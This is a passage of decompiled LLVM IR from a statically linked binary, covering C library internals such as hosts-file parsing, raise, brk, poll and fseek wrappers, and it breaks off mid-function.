  %v2_15bf417 = load i8, i8* %v1_15bf416, align 1
  %v3_15bf418 = zext i8 %v2_15bf417 to i32
  store i32 %v3_15bf418, i32* %r2.global-to-local, align 4
  %v2_15bf819 = icmp eq i8 %v2_15bf417, 0
  br i1 %v2_15bf819, label %dec_label_pc_15c28.preheader, label %dec_label_pc_15c00.lr.ph

dec_label_pc_15c00.lr.ph:                         ; preds = %dec_label_pc_15be0
  %v2_15c04.pre = load i32, i32* @global_var_23df4, align 4
  br label %dec_label_pc_15c00

dec_label_pc_15bf0:                               ; preds = %dec_label_pc_15c14
  %v1_15bf0 = add i32 %v0_15bf0, 1
  store i32 %v1_15bf0, i32* %r0.global-to-local, align 4
  %v1_15bf4 = inttoptr i32 %v1_15bf0 to i8*
  %v2_15bf4 = load i8, i8* %v1_15bf4, align 1
  %v3_15bf4 = zext i8 %v2_15bf4 to i32
  store i32 %v3_15bf4, i32* %r2.global-to-local, align 4
  %v2_15bf8 = icmp eq i8 %v2_15bf4, 0
  br i1 %v2_15bf8, label %dec_label_pc_15c28.preheader, label %dec_label_pc_15c00

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15c00.lr.ph, %dec_label_pc_15bf0
  %v0_15bf0 = phi i32 [ %v0_15bf415, %dec_label_pc_15c00.lr.ph ], [ %v1_15bf0, %dec_label_pc_15bf0 ]
  %v0_15c14 = phi i32 [ %v3_15bf418, %dec_label_pc_15c00.lr.ph ], [ %v3_15bf4, %dec_label_pc_15bf0 ]
  %v3_15c08 = mul nuw nsw i32 %v0_15c14, 2
  %v4_15c08 = add i32 %v3_15c08, %v2_15c04.pre
  %v5_15c08 = inttoptr i32 %v4_15c08 to i8*
  %v6_15c08 = load i8, i8* %v5_15c08, align 1
  %v1_15c0c = and i8 %v6_15c08, 32
  %v2_15c0c = icmp eq i8 %v1_15c0c, 0
  br i1 %v2_15c0c, label %dec_label_pc_15c14, label %dec_label_pc_15c28.preheader

dec_label_pc_15c14:                               ; preds = %dec_label_pc_15c00
  %v7_15c14 = icmp eq i32 %v0_15c14, 10
  br i1 %v7_15c14, label %dec_label_pc_15c28.preheader, label %dec_label_pc_15bf0

dec_label_pc_15c28.preheader:                     ; preds = %dec_label_pc_15c14, %dec_label_pc_15c00, %dec_label_pc_15bf0, %dec_label_pc_15be0
  %v0_15c2820 = phi i32 [ %v0_15bf415, %dec_label_pc_15be0 ], [ %v0_15bf0, %dec_label_pc_15c14 ], [ %v0_15bf0, %dec_label_pc_15c00 ], [ %v1_15bf0, %dec_label_pc_15bf0 ]
  %v1_15c2821 = inttoptr i32 %v0_15c2820 to i8*
  %v2_15c2822 = load i8, i8* %v1_15c2821, align 1
  %v3_15c2823 = zext i8 %v2_15c2822 to i32
  store i32 %v3_15c2823, i32* %r2.global-to-local, align 4
  %v2_15c2c24 = icmp eq i8 %v2_15c2822, 0
  br i1 %v2_15c2c24, label %dec_label_pc_15c50, label %dec_label_pc_15c34

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c34, %dec_label_pc_15c48
  %v3_15c24 = inttoptr i32 %v2_15c24 to i8*
  store i8 0, i8* %v3_15c24, align 1
  %v4_15c24 = load i32, i32* %r0.global-to-local, align 4
  %v5_15c24 = add i32 %v4_15c24, 1
  store i32 %v5_15c24, i32* %r0.global-to-local, align 4
  %v1_15c28 = inttoptr i32 %v5_15c24 to i8*
  %v2_15c28 = load i8, i8* %v1_15c28, align 1
  %v3_15c28 = zext i8 %v2_15c28 to i32
  store i32 %v3_15c28, i32* %r2.global-to-local, align 4
  %v2_15c2c = icmp eq i8 %v2_15c28, 0
  br i1 %v2_15c2c, label %dec_label_pc_15c50, label %dec_label_pc_15c34

dec_label_pc_15c34:                               ; preds = %dec_label_pc_15c28.preheader, %dec_label_pc_15c20
  %v0_15c48 = phi i32 [ %v3_15c28, %dec_label_pc_15c20 ], [ %v3_15c2823, %dec_label_pc_15c28.preheader ]
  %v2_15c24 = phi i32 [ %v5_15c24, %dec_label_pc_15c20 ], [ %v0_15c2820, %dec_label_pc_15c28.preheader ]
  %v2_15c38 = load i32, i32* @global_var_23df4, align 4
  %v3_15c3c = mul nuw nsw i32 %v0_15c48, 2
  %v4_15c3c = add i32 %v2_15c38, %v3_15c3c
  %v5_15c3c = inttoptr i32 %v4_15c3c to i8*
  %v6_15c3c = load i8, i8* %v5_15c3c, align 1
  %v1_15c40 = and i8 %v6_15c3c, 32
  %v2_15c40 = icmp eq i8 %v1_15c40, 0
  br i1 %v2_15c40, label %dec_label_pc_15c48, label %dec_label_pc_15c20

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c34
  %v7_15c48 = icmp eq i32 %v0_15c48, 10
  br i1 %v7_15c48, label %dec_label_pc_15c20, label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c20, %dec_label_pc_15c48, %dec_label_pc_15c28.preheader
  %v0_15c5434 = phi i32 [ %v0_15c2820, %dec_label_pc_15c28.preheader ], [ %v5_15c24, %dec_label_pc_15c20 ], [ %v2_15c24, %dec_label_pc_15c48 ]
  %v0_15c50 = load i32, i32* @r8, align 4
  %v1_15c50 = add i32 %v0_15c50, 1
  br label %dec_label_pc_15c54

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15bd0, %dec_label_pc_15c50
  %storemerge = phi i32 [ %v1_15c50, %dec_label_pc_15c50 ], [ 0, %dec_label_pc_15bd0 ]
  %v0_15be8 = phi i32 [ %v0_15c5434, %dec_label_pc_15c50 ], [ %v0_15c5435, %dec_label_pc_15bd0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_15c54 = inttoptr i32 %v0_15be8 to i8*
  %v2_15c54 = load i8, i8* %v1_15c54, align 1
  %v3_15c54 = zext i8 %v2_15c54 to i32
  %v2_15c58 = icmp eq i8 %v2_15c54, 0
  br i1 %v2_15c58, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_15c54
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_15c54, %bb56
  %v0_15c68.pr = phi i32 [ %v3_15c54, %dec_label_pc_15c54 ], [ 1, %bb56 ]
  %v1_15c60 = add i32 %storemerge, -4
  %v3_15c60 = sub i32 3, %storemerge
  %v4_15c60 = and i32 %v3_15c60, %storemerge
  %v5_15c60 = icmp slt i32 %v4_15c60, 0
  %v6_15c60 = icmp slt i32 %v1_15c60, 0
  %v7_15c60 = icmp eq i32 %storemerge, 4
  %v3_15c64 = xor i1 %v6_15c60, %v5_15c60
  %v4_15c64 = or i1 %v7_15c60, %v3_15c64
  br i1 %v4_15c64, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_15c70

bb58:                                             ; preds = %bb57
  %v2_15c68 = icmp eq i32 %v0_15c68.pr, 0
  br i1 %v2_15c68, label %dec_label_pc_15c70, label %dec_label_pc_15be0

dec_label_pc_15c70:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b01c.898 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_15c7c = call i32 @__GI_strcoll(i8* %v3_15c7c, i32 ptrtoint ([11 x i8]* @global_var_1b01c.898 to i32))
  store i32 %v4_15c7c, i32* %r0.global-to-local, align 4
  %v2_15c80 = icmp eq i32 %v4_15c7c, 0
  br i1 %v2_15c80, label %dec_label_pc_15ca8.preheader, label %dec_label_pc_15ccc

dec_label_pc_15ca8.preheader:                     ; preds = %dec_label_pc_15c70
  br label %dec_label_pc_15ca8

dec_label_pc_15c90:                               ; preds = %dec_label_pc_15cc0
  %v1_15c90 = add i32 %v5_15cb0, -36
  %v2_15c90 = inttoptr i32 %v1_15c90 to i32*
  %v3_15c90 = load i32, i32* %v2_15c90, align 4
  store i32 %v3_15c90, i32* %r0.global-to-local, align 4
  %v1_15c94 = inttoptr i32 %v3_15c90 to i8*
  %v2_15c94 = call i32 @__GI_strdup(i8* %v1_15c94)
  store i32 %v2_15c94, i32* %r0.global-to-local, align 4
  %v0_15c9c = load i32, i32* @r4, align 4
  %v1_15c9c = add i32 %v0_15c9c, 1
  store i32 %v1_15c9c, i32* %r2.global-to-local, align 4
  %v5_15ca0 = mul i32 %v0_15c9c, 4
  %v6_15ca0 = add i32 %v5_15ca0, ptrtoint (i32* @global_var_2a4a8.723 to i32)
  %v7_15ca0 = inttoptr i32 %v6_15ca0 to i32*
  store i32 %v2_15c94, i32* %v7_15ca0, align 4
  %v0_15ca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ca4 = load i32, i32* @r7, align 4
  %v2_15ca4 = inttoptr i32 %v1_15ca4 to i32*
  store i32 %v0_15ca4, i32* %v2_15ca4, align 4
  %v0_15cac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15ca8

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15ca8.preheader, %dec_label_pc_15c90
  %v0_15cb8 = phi i32 [ 1, %dec_label_pc_15ca8.preheader ], [ %v0_15cac.pre, %dec_label_pc_15c90 ]
  store i32 %v2_15be0, i32* %r2.global-to-local, align 4
  %v1_15cac = load i32, i32* @r8, align 4
  %v2_15cac = sub i32 %v0_15cb8, %v1_15cac
  %v4_15cac = xor i32 %v1_15cac, %v0_15cb8
  %v5_15cac = xor i32 %v2_15cac, %v0_15cb8
  %v6_15cac = and i32 %v5_15cac, %v4_15cac
  %v7_15cac = icmp slt i32 %v6_15cac, 0
  %v8_15cac = icmp slt i32 %v2_15cac, 0
  %v4_15cb0 = mul i32 %v0_15cb8, 4
  %v5_15cb0 = add i32 %v4_15cb0, %v2_15be0
  store i32 ptrtoint (i32* @global_var_2a4b4.720 to i32), i32* @r7, align 4
  %v1_15cb8 = add i32 %v0_15cb8, 1
  store i32 %v1_15cb8, i32* @r5, align 4
  %v2_15cbc = xor i1 %v8_15cac, %v7_15cac
  br i1 %v2_15cbc, label %dec_label_pc_15cc0, label %dec_label_pc_15ccc

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15ca8
  %v2_15cc0 = load i32, i32* @global_var_2a4b4.720, align 4
  store i32 %v2_15cc0, i32* @r4, align 4
  %v7_15cc8 = icmp slt i32 %v2_15cc0, 3
  br i1 %v7_15cc8, label %dec_label_pc_15c90, label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15ca8, %dec_label_pc_15cc0, %dec_label_pc_15c70
  %v0_15ccc = load i32, i32* @r6, align 4
  store i32 %v0_15ccc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b028.901 to i32), i32* @r1, align 4
  %v3_15cd4 = inttoptr i32 %v0_15ccc to i8*
  %v4_15cd4 = call i32 @__GI_strcoll(i8* %v3_15cd4, i32 ptrtoint ([7 x i8]* @global_var_1b028.901 to i32))
  store i32 %v4_15cd4, i32* %r0.global-to-local, align 4
  %v2_15cd8 = icmp eq i32 %v4_15cd4, 0
  br i1 %v2_15cd8, label %dec_label_pc_15d10.preheader, label %dec_label_pc_15ce0

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15ccc
  %v0_15ce0 = load i32, i32* @r6, align 4
  store i32 %v0_15ce0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b030.903 to i32), i32* @r1, align 4
  %v3_15ce8 = inttoptr i32 %v0_15ce0 to i8*
  %v4_15ce8 = call i32 @__GI_strcoll(i8* %v3_15ce8, i32 ptrtoint ([7 x i8]* @global_var_1b030.903 to i32))
  store i32 %v4_15ce8, i32* %r0.global-to-local, align 4
  %v2_15cec = icmp eq i32 %v4_15ce8, 0
  br i1 %v2_15cec, label %dec_label_pc_15d10.preheader, label %dec_label_pc_15d6c.backedge

dec_label_pc_15d10.preheader:                     ; preds = %dec_label_pc_15ccc, %dec_label_pc_15ce0
  store i32 ptrtoint (i32* @global_var_2a4b8.878 to i32), i32* @r4, align 4
  %v2_15d1460 = load i32, i32* @global_var_2a4b8.878, align 4
  store i32 ptrtoint (i32* @global_var_2a498.882 to i32), i32* @r5, align 4
  %v1_15d2063 = add i32 %v2_15d1460, -1
  store i32 %v1_15d2063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_15d1460, 1
  br i1 %tmp5964, label %dec_label_pc_15d28, label %dec_label_pc_15cf8

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15d10.preheader, %dec_label_pc_15cf8
  %v1_15d2065 = phi i32 [ %v1_15d20, %dec_label_pc_15cf8 ], [ %v1_15d2063, %dec_label_pc_15d10.preheader ]
  %v4_15cf8 = mul i32 %v1_15d2065, 4
  %v5_15cf8 = add i32 %v4_15cf8, ptrtoint (i32* @global_var_2a498.882 to i32)
  %v6_15cf8 = inttoptr i32 %v5_15cf8 to i32*
  %v7_15cf8 = load i32, i32* %v6_15cf8, align 4
  store i32 %v7_15cf8, i32* @r0, align 4
  store i32 %v1_15d2065, i32* @global_var_2a4b8.878, align 4
  %v0_15d00 = call i32 @free()
  store i32 %v0_15d00, i32* %r0.global-to-local, align 4
  %v0_15d04 = load i32, i32* @r4, align 4
  %v1_15d04 = inttoptr i32 %v0_15d04 to i32*
  %v2_15d04 = load i32, i32* %v1_15d04, align 4
  %v1_15d0c = load i32, i32* @r5, align 4
  %v5_15d0c = mul i32 %v2_15d04, 4
  %v6_15d0c = add i32 %v1_15d0c, %v5_15d0c
  %v7_15d0c = inttoptr i32 %v6_15d0c to i32*
  store i32 0, i32* %v7_15d0c, align 4
  store i32 ptrtoint (i32* @global_var_2a4b8.878 to i32), i32* @r4, align 4
  %v2_15d14 = load i32, i32* @global_var_2a4b8.878, align 4
  store i32 ptrtoint (i32* @global_var_2a498.882 to i32), i32* @r5, align 4
  %v1_15d20 = add i32 %v2_15d14, -1
  store i32 %v1_15d20, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_15d14, 1
  br i1 %tmp59, label %dec_label_pc_15d28, label %dec_label_pc_15cf8

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15cf8, %dec_label_pc_15d10.preheader
  br label %dec_label_pc_15d48

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d60
  %v1_15d30 = add i32 %v5_15d50, -36
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  %v3_15d30 = load i32, i32* %v2_15d30, align 4
  store i32 %v3_15d30, i32* %r0.global-to-local, align 4
  %v1_15d34 = inttoptr i32 %v3_15d30 to i8*
  %v2_15d34 = call i32 @__GI_strdup(i8* %v1_15d34)
  store i32 %v2_15d34, i32* %r0.global-to-local, align 4
  %v0_15d3c = load i32, i32* @r4, align 4
  %v1_15d3c = add i32 %v0_15d3c, 1
  store i32 %v1_15d3c, i32* %r2.global-to-local, align 4
  %v5_15d40 = mul i32 %v0_15d3c, 4
  %v6_15d40 = add i32 %v5_15d40, ptrtoint (i32* @global_var_2a498.882 to i32)
  %v7_15d40 = inttoptr i32 %v6_15d40 to i32*
  store i32 %v2_15d34, i32* %v7_15d40, align 4
  %v0_15d44 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d44 = load i32, i32* @r6, align 4
  %v2_15d44 = inttoptr i32 %v1_15d44 to i32*
  store i32 %v0_15d44, i32* %v2_15d44, align 4
  %v0_15d4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d28, %dec_label_pc_15d30
  %v0_15d58 = phi i32 [ 1, %dec_label_pc_15d28 ], [ %v0_15d4c.pre, %dec_label_pc_15d30 ]
  store i32 %v2_15be0, i32* %r2.global-to-local, align 4
  %v1_15d4c = load i32, i32* @r8, align 4
  %v2_15d4c = sub i32 %v0_15d58, %v1_15d4c
  %v4_15d4c = xor i32 %v1_15d4c, %v0_15d58
  %v5_15d4c = xor i32 %v2_15d4c, %v0_15d58
  %v6_15d4c = and i32 %v5_15d4c, %v4_15d4c
  %v7_15d4c = icmp slt i32 %v6_15d4c, 0
  %v8_15d4c = icmp slt i32 %v2_15d4c, 0
  %v4_15d50 = mul i32 %v0_15d58, 4
  %v5_15d50 = add i32 %v4_15d50, %v2_15be0
  store i32 ptrtoint (i32* @global_var_2a4b8.878 to i32), i32* @r6, align 4
  %v1_15d58 = add i32 %v0_15d58, 1
  store i32 %v1_15d58, i32* @r5, align 4
  %v2_15d5c = xor i1 %v8_15d4c, %v7_15d4c
  br i1 %v2_15d5c, label %dec_label_pc_15d60, label %dec_label_pc_15d6c.backedge

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d48
  %v2_15d60 = load i32, i32* @global_var_2a4b8.878, align 4
  store i32 %v2_15d60, i32* @r4, align 4
  %v7_15d68 = icmp slt i32 %v2_15d60, 4
  br i1 %v7_15d68, label %dec_label_pc_15d30, label %dec_label_pc_15d6c.backedge

dec_label_pc_15b9c.preheader:                     ; preds = %dec_label_pc_15b9c.preheader.lr.ph, %dec_label_pc_15d6c.backedge
  store i32 %v2_15b30, i32* %r0.global-to-local, align 4
  %v2_15b9c12 = load i8, i8* %v1_15b9c11, align 4
  %v3_15b9c13 = zext i8 %v2_15b9c12 to i32
  store i32 %v3_15b9c13, i32* %r2.global-to-local, align 4
  %v2_15ba014 = icmp eq i8 %v2_15b9c12, 0
  br i1 %v2_15ba014, label %dec_label_pc_15bbc, label %dec_label_pc_15ba8.lr.ph

dec_label_pc_15ba8.lr.ph:                         ; preds = %dec_label_pc_15b9c.preheader
  %v2_15bac.pre = load i32, i32* @global_var_23df4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d6c.backedge, %dec_label_pc_15d6c.preheader
  %v0_15d8c = load i32, i32* @sl, align 4
  store i32 %v0_15d8c, i32* %r0.global-to-local, align 4
  %v1_15d90 = inttoptr i32 %v0_15d8c to i8*
  %v2_15d90 = call i32 @__GI_fclose(i8* %v1_15d90)
  store i32 %v2_15d90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15d98:                               ; preds = %dec_label_pc_15b80
  %v0_15d98 = call i32 @__GI___h_errno_location()
  store i32 %v0_15d98, i32* %r0.global-to-local, align 4
  %v2_15da0 = inttoptr i32 %v0_15d98 to i32*
  store i32 3, i32* %v2_15da0, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %entry, %dec_label_pc_15d8c, %dec_label_pc_15d98
  store i32 %v2_15b34, i32* @r0, align 4
  %v1_15db4 = call i32 @__pthread_return_void()
  store i32 %v1_15db4, i32* %r0.global-to-local, align 4
  store i32 %v6_15b2c, i32* @r5, align 4
  store i32 %v9_15b2c, i32* @r6, align 4
  store i32 %v12_15b2c, i32* @r7, align 4
  store i32 %v15_15b2c, i32* @r8, align 4
  store i32 %v18_15b2c, i32* @sl, align 4
  ret i32 %v1_15db4

; uselistorder directives
  uselistorder i32 %v3_15b9c13, { 2, 1, 0 }
  uselistorder i32 %v2_15d4c, { 1, 0 }
  uselistorder i32 %v0_15d58, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_15d20, { 1, 0 }
  uselistorder i32 %v1_15d2065, { 1, 0 }
  uselistorder i32 %v2_15cac, { 1, 0 }
  uselistorder i32 %v0_15cb8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15be8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_15c2820, { 1, 0, 2 }
  uselistorder i32 %v2_15be0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_15b30, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 2, 0, 1, 3, 13, 6, 4, 5, 7, 17, 8, 16, 9, 11, 10, 14, 12 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 20, 6, 5, 7, 9, 8, 11, 10, 13, 12, 21, 14, 15, 19, 16, 18, 23, 22, 17, 28, 27, 24, 26, 0, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2a498.882 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2a4b8.878, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2a4b8.878 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2a4a8.723 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 6, 3, 4, 8, 9, 10, 11, 7, 12, 5, 13 }
  uselistorder i32* @global_var_2a4b4.720, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_15da4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b9c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d48, { 1, 0 }
  uselistorder label %dec_label_pc_15cf8, { 1, 0 }
  uselistorder label %dec_label_pc_15d10.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15ccc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ca8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_15c54, { 1, 0 }
  uselistorder label %dec_label_pc_15c50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c34, { 1, 0 }
  uselistorder label %dec_label_pc_15c20, { 1, 0 }
  uselistorder label %dec_label_pc_15c00, { 1, 0 }
  uselistorder label %dec_label_pc_15d6c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_15bbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d6c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_15e3c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_15e3c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15e48 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15e50 = call i32 @__libc_getpid()
  store i32 %v3_15e48, i32* @r4, align 4
  %v0_15e5c = call i32 @kill()
  ret i32 %v0_15e5c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15e60 = add i32 %arg1, 28
  %v2_15e60 = inttoptr i32 %v1_15e60 to i32*
  %v3_15e60 = load i32, i32* %v2_15e60, align 4
  %v1_15e68 = add i32 %arg1, 44
  %v2_15e68 = inttoptr i32 %v1_15e68 to i32*
  %v3_15e68 = load i32, i32* %v2_15e68, align 4
  store i32 %v3_15e60, i32* @global_var_2a4bc.908, align 4
  store i32 %v3_15e68, i32* @global_var_2a4c0.910, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15e8c = call i32 @brk(i32* %arg1)
  %v3_15e90 = icmp ult i32 %v2_15e8c, %tmp
  store i32 %v2_15e8c, i32* @global_var_2a3ec.845, align 4
  br i1 %v3_15e90, label %dec_label_pc_15ea4, label %dec_label_pc_15eb4

dec_label_pc_15ea4:                               ; preds = %entry
  %v0_15ea4 = call i32 @__errno_location()
  %v2_15eac = inttoptr i32 %v0_15ea4 to i32*
  store i32 12, i32* %v2_15eac, align 4
  br label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %entry, %dec_label_pc_15ea4
  %v0_15eb4 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_15ea4 ]
  ret i32 %v0_15eb4

; uselistorder directives
  uselistorder i32* @global_var_2a3ec.845, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15eb4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15ec0 = load i32, i32* @r4, align 4
  store i32 %v3_15ec0, i32* %stack_var_-8, align 4
  %v5_15ec4 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_15ec4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15ec4, -4095
  br i1 %tmp, label %dec_label_pc_15ee4, label %dec_label_pc_15ed4

dec_label_pc_15ed4:                               ; preds = %entry
  %v0_15ed4 = call i32 @__errno_location()
  %v0_15ed8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ed8 = sub i32 0, %v0_15ed8
  %v2_15edc = inttoptr i32 %v0_15ed4 to i32*
  store i32 %v1_15ed8, i32* %v2_15edc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ee4

dec_label_pc_15ee4:                               ; preds = %entry, %dec_label_pc_15ed4
  %v0_15ee4 = phi i32 [ %v5_15ec4, %entry ], [ -1, %dec_label_pc_15ed4 ]
  %v2_15ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ee8, i32* @r4, align 4
  ret i32 %v0_15ee4

; uselistorder directives
  uselistorder i32 %v5_15ec4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ee4, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_15eec = load i32, i32* @r2, align 4
  store i32 %v0_15eec, i32* @r3, align 4
  %v0_15ef4 = call i32 @__GI_fseeko64()
  ret i32 %v0_15ef4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_15ef8 = load i32, i32* @r4, align 4
  %v6_15ef8 = load i32, i32* @r5, align 4
  %v9_15ef8 = load i32, i32* @r6, align 4
  %v0_15efc = load i32, i32* @r3, align 4
  %v2_15f00 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_15efc, i32* @r6, align 4
  %v0_15f08 = load i32, i32* @r0, align 4
  store i32 %v0_15f08, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15efc, 3
  br i1 %tmp, label %dec_label_pc_15f24, label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %entry
  %v0_15f10 = call i32 @__errno_location()
  store i32 %v0_15f10, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_15f1c = inttoptr i32 %v0_15f10 to i32*
  store i32 22, i32* %v2_15f1c, align 4
  br label %.thread3

dec_label_pc_15f24:                               ; preds = %entry
  %v1_15f24 = add i32 %v0_15f08, 52
  %v2_15f24 = inttoptr i32 %v1_15f24 to i32*
  %v3_15f24 = load i32, i32* %v2_15f24, align 4
  store i32 %v3_15f24, i32* %r7.global-to-local, align 4
  %v2_15f28 = icmp eq i32 %v3_15f24, 0
  %v0_15f2c = load i32, i32* @r1, align 4
  store i32 %v0_15f2c, i32* %stack_var_-28, align 4
  br i1 %v2_15f28, label %dec_label_pc_15f38, label %dec_label_pc_15f64

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f24
  %v1_15f38 = add i32 %v0_15f08, 56
  store i32 %v1_15f38, i32* @r4, align 4
  store i32 79740, i32* %r3.global-to-local, align 4
  store i32 %v2_15f00, i32* @r0, align 4
  store i32 %v1_15f38, i32* %r2.global-to-local, align 4
  %v1_15f50 = call i32 @__pthread_return_void()
  %v0_15f54 = load i32, i32* @r4, align 4
  store i32 %v0_15f54, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r3.global-to-local, align 4
  store i32 89956, i32* @lr, align 4
  %v1_15f60 = call i32 @__pthread_return_0()
  store i32 %v1_15f60, i32* %r0.global-to-local, align 4
  %v0_15f64.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15f64

dec_label_pc_15f64:                               ; preds = %dec_label_pc_15f24, %dec_label_pc_15f38
  %v0_15f70 = phi i32 [ %v0_15f08, %dec_label_pc_15f24 ], [ %v0_15f64.pre, %dec_label_pc_15f38 ]
  %v1_15f64 = inttoptr i32 %v0_15f70 to i8*
  %v2_15f64 = load i8, i8* %v1_15f64, align 1
  %v3_15f64 = zext i8 %v2_15f64 to i32
  store i32 %v3_15f64, i32* %r3.global-to-local, align 4
  %v1_15f68 = and i32 %v3_15f64, 64
  %v2_15f68 = icmp eq i32 %v1_15f68, 0
  br i1 %v2_15f68, label %dec_label_pc_15f80, label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f64
  store i32 %v0_15f70, i32* @r0, align 4
  %v0_15f74 = call i32 @__stdio_wcommit()
  store i32 %v0_15f74, i32* %r0.global-to-local, align 4
  %v2_15f78 = icmp eq i32 %v0_15f74, 0
  br i1 %v2_15f78, label %dec_label_pc_15f80, label %dec_label_pc_15ff0

